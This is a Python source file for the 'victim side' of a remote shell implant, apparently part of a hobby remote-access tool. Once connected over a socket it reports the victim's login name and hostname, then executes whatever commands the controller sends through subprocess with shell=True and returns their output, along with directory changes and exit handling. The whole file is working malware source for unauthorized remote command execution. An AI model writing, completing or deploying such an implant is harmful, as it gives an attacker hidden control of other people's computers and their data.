import os
import subprocess
import threading

from src.modlues.CLI.commmad_invoker import CommandInvoker
from src.modlues.protocols.general import GeneralPacket, GeneralPacketType
from src.modlues.protocols.protocol import HandelPacket, Packet, SendPacket, PacketType, PacketConstants
from src.modlues.protocols.remote_shell import RemoteShellPacket, RemoteShellPacketType


class RemoteShellVictimSide:

    def __init__(self, sock):
        self.sock = sock
        self.is_connected = False

        self.commands = dict()

        self.commands = {
            "cd": self.__cd,
            "exit": self.__disconnect
        }

        self.command_invoker = CommandInvoker(self.commands)

        self.last_cwd = ''

    def main(self):
        self.__connect()

        while self.is_connected:
            try:
                packet = HandelPacket.recv_packet(self.sock)
                print(packet.payload.decode())
                self.handle(packet)
            except Exception as e:
                print(e)
                self.is_connected = False
        else:
            pass

    def handle(self, packet: Packet):

        if packet.packet_type == PacketType.REMOTE_SHELL.value:
            if packet.packet_sub_type == RemoteShellPacketType.COMMAND.value:
                print(packet.payload.decode())
                threading.Thread(target=self.__execute_and_capture, args=(packet.payload.decode(),)).start()

            if packet.packet_sub_type == RemoteShellPacketType.EXIT.value:
                self.__disconnect()
        else:
            SendPacket.send_packet(self.sock, packet)

    def __connect(self):
        packet = GeneralPacket(GeneralPacketType.ACK)
        SendPacket.send_packet(self.sock, packet)

        self.is_connected = True

        print("send ack")
        packet_payload = f'{os.getlogin()}@{os.uname()[1]}'.encode()
        packet = RemoteShellPacket(RemoteShellPacketType.VICTIM_INFO, packet_payload)
        SendPacket.send_packet(self.sock, packet)

        self.__send_cwd(os.getcwd())

    def __disconnect(self):
        packet = RemoteShellPacket(RemoteShellPacketType.EXIT, "Disconnecting...".encode())
        SendPacket.send_packet(self.sock, packet)
        self.is_connected = False

    def __cd(self, path):
        try:
            if path[0] == '/':
                os.chdir(path)
            else:
                cwd = os.getcwd()
                os.chdir(f"{cwd}/{path}")
            self.__send_cwd(os.getcwd())
        except FileNotFoundError:
            print(f'{path} is not found')
            self.__send_output(f'{path} is not found'.encode())

    def __execute_and_capture(self, command: str):
        if command[0:2] == 'cd':
            self.__cd(command[3:])
            print("cd")
        else:
            print(f"running {command} on subprocess")
            try:
                result = subprocess.run(command, timeout=30, shell=True ,capture_output=True)
            except Exception as e:
                self.__send_output((str(e) + '\n').encode())
            else:
                self.__send_output(result.stdout + result.stderr)

    def __send_output(self, output: bytes):
        packet = RemoteShellPacket(RemoteShellPacketType.OUTPUT, output)
        SendPacket.send_packet(self.sock, packet)

    def __send_cwd(self, cwd):
        packet = RemoteShellPacket(RemoteShellPacketType.CWD, cwd.encode())
        SendPacket.send_packet(self.sock, packet)
        print("sent cwd")
